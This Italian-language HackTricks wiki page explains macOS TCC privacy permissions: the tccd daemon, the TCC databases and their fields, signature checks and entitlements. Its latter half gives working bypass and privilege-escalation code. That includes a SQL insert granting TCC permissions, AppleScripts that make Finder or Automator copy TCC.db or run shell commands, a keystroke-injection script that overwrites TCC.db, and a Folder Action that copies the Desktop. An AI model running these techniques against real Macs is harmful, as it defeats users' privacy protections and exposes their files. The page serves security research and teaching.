# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Informazioni di Base**

**TCC (Trasparenza, Consenso e Controllo)** è un protocollo di sicurezza che si concentra sulla regolamentazione delle autorizzazioni delle applicazioni. Il suo ruolo principale è quello di proteggere funzionalità sensibili come **servizi di localizzazione, contatti, foto, microfono, fotocamera, accessibilità e accesso completo al disco**. Richiedendo il consenso esplicito dell'utente prima di concedere l'accesso dell'app a questi elementi, TCC migliora la privacy e il controllo dell'utente sui propri dati.

Gli utenti incontrano TCC quando le applicazioni richiedono l'accesso a funzionalità protette. Questo è visibile attraverso un prompt che consente agli utenti di **approvare o negare l'accesso**. Inoltre, TCC consente azioni dirette dell'utente, come **trascinare e rilasciare file in un'applicazione**, per concedere accesso a file specifici, garantendo che le applicazioni abbiano accesso solo a ciò che è esplicitamente consentito.

![Un esempio di un prompt TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** è gestito dal **daemon** situato in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurato in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando il servizio mach `com.apple.tccd.system`).

C'è un **tccd in modalità utente** in esecuzione per ogni utente connesso definito in `/System/Library/LaunchAgents/com.apple.tccd.plist` che registra i servizi mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Qui puoi vedere il tccd in esecuzione come sistema e come utente:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
I permessi sono **ereditati dall'applicazione padre** e i **permessi** sono **tracciati** in base al **Bundle ID** e al **Developer ID**.

### Database TCC

Le autorizzazioni/negazioni sono quindi memorizzate in alcuni database TCC:

- Il database a livello di sistema in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Questo database è **protetto da SIP**, quindi solo un bypass SIP può scriverci.
- Il database TCC dell'utente **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** per le preferenze per utente.
- Questo database è protetto, quindi solo i processi con alti privilegi TCC come l'accesso completo al disco possono scriverci (ma non è protetto da SIP).

> [!WARNING]
> I database precedenti sono anche **protetti da TCC per l'accesso in lettura**. Quindi **non sarai in grado di leggere** il tuo database TCC utente regolare a meno che non provenga da un processo privilegiato TCC.
>
> Tuttavia, ricorda che un processo con questi alti privilegi (come **FDA** o **`kTCCServiceEndpointSecurityClient`**) sarà in grado di scrivere nel database TCC degli utenti.

- C'è un **terzo** database TCC in **`/var/db/locationd/clients.plist`** per indicare i client autorizzati ad **accedere ai servizi di localizzazione**.
- Il file protetto da SIP **`/Users/carlospolop/Downloads/REG.db`** (anch'esso protetto dall'accesso in lettura con TCC), contiene la **posizione** di tutti i **database TCC validi**.
- Il file protetto da SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (anch'esso protetto dall'accesso in lettura con TCC), contiene ulteriori permessi concessi da TCC.
- Il file protetto da SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (leggibile da chiunque) è un elenco di autorizzazione delle applicazioni che richiedono un'eccezione TCC.

> [!TIP]
> Il database TCC in **iOS** si trova in **`/private/var/mobile/Library/TCC/TCC.db`**.

> [!NOTE]
> L'**interfaccia del centro notifiche** può apportare **modifiche al database TCC di sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Tuttavia, gli utenti possono **eliminare o interrogare le regole** con l'utilità da riga di comando **`tccutil`**.

#### Interrogare i database

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Controllando entrambe le banche dati puoi verificare i permessi che un'app ha consentito, ha vietato o non ha (chiederà di essi).

- Il **`service`** è la rappresentazione della stringa di **permesso** TCC
- Il **`client`** è il **bundle ID** o **percorso del binario** con i permessi
- Il **`client_type`** indica se si tratta di un Identificatore di Bundle(0) o di un percorso assoluto(1)

<details>

<summary>Come eseguire se è un percorso assoluto</summary>

Basta fare **`launctl load you_bin.plist`**, con un plist come:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- Il **`auth_value`** può avere valori diversi: denied(0), unknown(1), allowed(2) o limited(3).
- Il **`auth_reason`** può assumere i seguenti valori: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Il campo **csreq** è presente per indicare come verificare il binario da eseguire e concedere i permessi TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Per ulteriori informazioni sui **altri campi** della tabella [**controlla questo post del blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Puoi anche controllare le **autorizzazioni già concesse** alle app in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Gli utenti _possono_ **eliminare o interrogare le regole** utilizzando **`tccutil`**.

#### Ripristina le autorizzazioni TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Controlli della Firma TCC

Il **database** TCC memorizza il **Bundle ID** dell'applicazione, ma **memorizza** anche **informazioni** sulla **firma** per **assicurarsi** che l'App che richiede di utilizzare un permesso sia quella corretta.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Pertanto, altre applicazioni che utilizzano lo stesso nome e ID bundle non potranno accedere ai permessi concessi ad altre app.

### Diritti e Permessi TCC

Le app **non hanno solo bisogno** di **richiedere** e di avere **accesso** a alcune risorse, ma devono anche **avere i diritti pertinenti**.\
Ad esempio, **Telegram** ha il diritto `com.apple.security.device.camera` per richiedere **accesso alla fotocamera**. Un **app** che **non ha** questo **diritto non potrà** accedere alla fotocamera (e l'utente non verrà nemmeno chiesto per i permessi).

Tuttavia, per le app per **accedere** a **determinate cartelle utente**, come `~/Desktop`, `~/Downloads` e `~/Documents`, **non hanno bisogno** di avere diritti specifici. Il sistema gestirà l'accesso in modo trasparente e **chiederà all'utente** secondo necessità.

Le app di Apple **non genereranno richieste**. Contengono **diritti pre-concessi** nella loro lista di **diritti**, il che significa che **non genereranno mai un popup**, **né** appariranno in nessuna delle **banche dati TCC**. Ad esempio:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Questo eviterà che Calendar chieda all'utente di accedere a promemoria, calendario e rubrica.

> [!TIP]
> Oltre ad alcune documentazioni ufficiali sugli entitlement, è anche possibile trovare **informazioni interessanti sugli entitlement in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Alcuni permessi TCC sono: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Non esiste un elenco pubblico che definisca tutti, ma puoi controllare questo [**elenco di quelli noti**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Luoghi sensibili non protetti

- $HOME (stesso)
- $HOME/.ssh, $HOME/.aws, ecc
- /tmp

### Intento dell'utente / com.apple.macl

Come menzionato in precedenza, è possibile **concedere accesso a un'app a un file trascinandolo e rilasciandolo su di essa**. Questo accesso non sarà specificato in alcun database TCC ma come un **attributo esteso del file**. Questo attributo **memorizzerà l'UUID** dell'app autorizzata:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> È curioso che l'attributo **`com.apple.macl`** sia gestito dal **Sandbox**, non da tccd.
>
> Nota anche che se sposti un file che consente l'UUID di un'app nel tuo computer a un altro computer, poiché la stessa app avrà UIDs diversi, non concederà accesso a quell'app.

L'attributo esteso `com.apple.macl` **non può essere cancellato** come altri attributi estesi perché è **protetto da SIP**. Tuttavia, come [**spiegato in questo post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), è possibile disabilitarlo **zippando** il file, **eliminandolo** e **decomprendendolo**.

## TCC Privesc & Bypasses

### Inserisci in TCC

Se a un certo punto riesci ad ottenere accesso in scrittura su un database TCC, puoi usare qualcosa di simile al seguente per aggiungere un'entrata (rimuovi i commenti):

<details>

<summary>Esempio di inserimento in TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### Payload TCC

Se sei riuscito a entrare in un'app con alcune autorizzazioni TCC, controlla la seguente pagina con i payload TCC per abusarne:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Eventi Apple

Scopri di più sugli Eventi Apple in:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Automazione (Finder) a FDA\*

Il nome TCC dell'autorizzazione Automazione è: **`kTCCServiceAppleEvents`**\
Questa specifica autorizzazione TCC indica anche l'**applicazione che può essere gestita** all'interno del database TCC (quindi le autorizzazioni non consentono solo di gestire tutto).

**Finder** è un'applicazione che **ha sempre FDA** (anche se non appare nell'interfaccia utente), quindi se hai privilegi di **Automazione** su di essa, puoi abusare dei suoi privilegi per **farle eseguire alcune azioni**.\
In questo caso, la tua app avrebbe bisogno dell'autorizzazione **`kTCCServiceAppleEvents`** su **`com.apple.Finder`**.

{{#tabs}}
{{#tab name="Rubare il TCC.db degli utenti"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Rubare TCC.db dei sistemi"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Potresti abusare di questo per **scrivere il tuo database TCC utente**.

> [!WARNING]
> Con questo permesso sarai in grado di **chiedere a Finder di accedere alle cartelle TCC riservate** e darti i file, ma per quanto ne so **non sarai in grado di far eseguire a Finder codice arbitrario** per abusare completamente del suo accesso FDA.
>
> Pertanto, non sarai in grado di abusare delle piene capacità FDA.

Questo è il prompt TCC per ottenere privilegi di Automazione su Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Nota che poiché l'app **Automator** ha il permesso TCC **`kTCCServiceAppleEvents`**, può **controllare qualsiasi app**, come Finder. Quindi, avendo il permesso di controllare Automator, potresti anche controllare il **Finder** con un codice come quello qui sotto:

<details>

<summary>Ottieni una shell all'interno di Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Lo stesso vale per l'**app Script Editor,** può controllare Finder, ma utilizzando un AppleScript non puoi costringerlo a eseguire uno script.

### Automazione (SE) a qualche TCC

**System Events può creare Azioni di Cartella, e le azioni di cartella possono accedere ad alcune cartelle TCC** (Desktop, Documenti e Download), quindi uno script come il seguente può essere utilizzato per abusare di questo comportamento:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automazione (SE) + Accessibilità (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** a FDA\*

L'automazione su **`System Events`** + Accessibilità (**`kTCCServicePostEvent`**) consente di inviare **sequenze di tasti ai processi**. In questo modo potresti abusare di Finder per modificare il TCC.db degli utenti o per concedere FDA a un'app arbitraria (anche se potrebbe essere richiesta una password per questo).

Esempio di sovrascrittura del TCC.db degli utenti da parte di Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` a FDA\*

Controlla questa pagina per alcuni [**payloads per abusare delle autorizzazioni di Accessibilità**](macos-tcc-payloads.md#accessibility) per privesc a FDA\* o eseguire un keylogger, ad esempio.

### **Endpoint Security Client a FDA**

Se hai **`kTCCServiceEndpointSecurityClient`**, hai FDA. Fine.

### File di Sistema Policy SysAdmin a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** consente di **cambiare** l'attributo **`NFSHomeDirectory`** di un utente che cambia la sua cartella home e quindi consente di **bypassare TCC**.

### Database TCC Utente a FDA

Ottenendo **autorizzazioni di scrittura** sul database **TCC utente** non puoi concederti **`FDA`** autorizzazioni, solo colui che vive nel database di sistema può concedere ciò.

Ma puoi **darti** **`diritti di automazione a Finder`**, e abusare della tecnica precedente per escalare a FDA\*.

### **FDA a autorizzazioni TCC**

**Accesso Completo al Disco** è il nome TCC **`kTCCServiceSystemPolicyAllFiles`**

Non penso che questo sia un vero privesc, ma giusto nel caso lo trovi utile: Se controlli un programma con FDA puoi **modificare il database TCC degli utenti e darti qualsiasi accesso**. Questo può essere utile come tecnica di persistenza nel caso tu possa perdere le tue autorizzazioni FDA.

### **SIP Bypass a TCC Bypass**

Il **database TCC di sistema** è protetto da **SIP**, ecco perché solo i processi con le **autorizzazioni indicate potranno modificarlo**. Pertanto, se un attaccante trova un **bypass SIP** su un **file** (essere in grado di modificare un file ristretto da SIP), sarà in grado di:

- **Rimuovere la protezione** di un database TCC e darsi tutte le autorizzazioni TCC. Potrebbe abusare di uno di questi file, ad esempio:
- Il database di sistema TCC
- REG.db
- MDMOverrides.plist

Tuttavia, c'è un'altra opzione per abusare di questo **bypass SIP per bypassare TCC**, il file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` è un elenco di applicazioni che richiedono un'eccezione TCC. Pertanto, se un attaccante può **rimuovere la protezione SIP** da questo file e aggiungere la sua **applicazione**, l'applicazione sarà in grado di bypassare TCC.\
Ad esempio, per aggiungere il terminale:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Bypass TCC

{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Riferimenti

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
